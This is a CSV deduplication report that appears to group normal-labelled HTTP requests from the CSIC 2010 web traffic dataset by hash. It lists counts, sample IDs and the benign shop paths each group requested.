"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"canonical_raw_request_hash","9e892807842b26898c4e1528","92","0","csic_2010","csic_normal","norm_csic_002872|norm_csic_001991|norm_csic_001430|norm_csic_001542|norm_csic_001065|norm_csic_001766|norm_csic_001250|norm_csic_000544|norm_csic_001680|norm_csic_000899","GET","/tienda1/miembros/salir.jsp",""
"canonical_raw_request_hash","f86180b607ffe97e62a9d5af","92","0","csic_2010","csic_normal","norm_csic_002271|norm_csic_000351|norm_csic_001982|norm_csic_000832|norm_csic_001320|norm_csic_001281|norm_csic_002626|norm_csic_001047|norm_csic_000327|norm_csic_000517","GET","/tienda1/global/titulo.jsp",""
"canonical_raw_request_hash","fd9a37959b16af3f29af90ce","92","0","csic_2010","csic_normal","norm_csic_000894|norm_csic_002083|norm_csic_001075|norm_csic_000981|norm_csic_000850|norm_csic_001134|norm_csic_001274|norm_csic_001806|norm_csic_000607|norm_csic_001338","GET","/tienda1/publico/productos.jsp",""
"canonical_raw_request_hash","409a27980f06c765e01ce9de","91","0","csic_2010","csic_normal","norm_csic_002059|norm_csic_001180|norm_csic_002312|norm_csic_002459|norm_csic_000187|norm_csic_001095|norm_csic_000689|norm_csic_001620|norm_csic_002405|norm_csic_001388","GET","/tienda1/miembros/imagenes/ogono.jpg",""
"canonical_raw_request_hash","50b3918f959ebf36ceb8218f","89","0","csic_2010","csic_normal","norm_csic_000792|norm_csic_001437|norm_csic_002573|norm_csic_000353|norm_csic_001927|norm_csic_000787|norm_csic_000355|norm_csic_000929|norm_csic_002829|norm_csic_002436","GET","/tienda1/global/creditos.jsp",""
"canonical_raw_request_hash","9235d74f03c224b1587bbc2a","89","0","csic_2010","csic_normal","norm_csic_002467|norm_csic_001140|norm_csic_002935|norm_csic_000857|norm_csic_001711|norm_csic_000095|norm_csic_000329|norm_csic_002465|norm_csic_002879|norm_csic_001308","GET","/tienda1/imagenes/nuestratierra.jpg",""
"canonical_raw_request_hash","99d6caba7cbd49b32b868a14","89","0","csic_2010","csic_normal","norm_csic_001578|norm_csic_002776|norm_csic_001244|norm_csic_000835|norm_csic_002875|norm_csic_001419|norm_csic_002478|norm_csic_000415|norm_csic_000514|norm_csic_000661","GET","/tienda1/global/menum.jsp",""
"canonical_raw_request_hash","00ec3ec12c0f73dcd06f7fd4","88","0","csic_2010","csic_normal","norm_csic_000122|norm_csic_002149|norm_csic_002400|norm_csic_002750|norm_csic_002308|norm_csic_000861|norm_csic_000534|norm_csic_001958|norm_csic_001486|norm_csic_001932","GET","/tienda1/imagenes/3.gif",""
"canonical_raw_request_hash","37faff5693985bfc85c34ccc","88","0","csic_2010","csic_normal","norm_csic_002536|norm_csic_000569|norm_csic_002430|norm_csic_000167|norm_csic_002474|norm_csic_000874|norm_csic_001008|norm_csic_002118|norm_csic_002789|norm_csic_000542","GET","/tienda1/publico/miembros.jsp",""
"canonical_raw_request_hash","557c6bed41ce2bf23ed46dd7","88","0","csic_2010","csic_normal","norm_csic_001013|norm_csic_001666|norm_csic_000586|norm_csic_001554|norm_csic_001478|norm_csic_000110|norm_csic_001898|norm_csic_002145|norm_csic_001866|norm_csic_000994","GET","/tienda1/publico/entrar.jsp","errorMsg=Credenciales+incorrectas"
"canonical_raw_request_hash","551173f31cfc7c31d9cfc4de","87","0","csic_2010","csic_normal","norm_csic_001594|norm_csic_001966|norm_csic_002284|norm_csic_001555|norm_csic_001590|norm_csic_002052|norm_csic_000184|norm_csic_001048|norm_csic_000075|norm_csic_001612","GET","/tienda1/imagenes/logo.gif",""
"canonical_raw_request_hash","631e3be6309a565585422cd7","86","0","csic_2010","csic_normal","norm_csic_000320|norm_csic_000183|norm_csic_001674|norm_csic_000009|norm_csic_001731|norm_csic_000343|norm_csic_001498|norm_csic_000052|norm_csic_000757|norm_csic_002415","POST","/tienda1/publico/entrar.jsp",""
"canonical_raw_request_hash","b6a2863131d6cc931108f1e2","86","0","csic_2010","csic_normal","norm_csic_000671|norm_csic_002183|norm_csic_000946|norm_csic_000131|norm_csic_000001|norm_csic_001276|norm_csic_002618|norm_csic_001990|norm_csic_001960|norm_csic_000877","GET","/tienda1/miembros/imagenes/zarauz.jpg",""
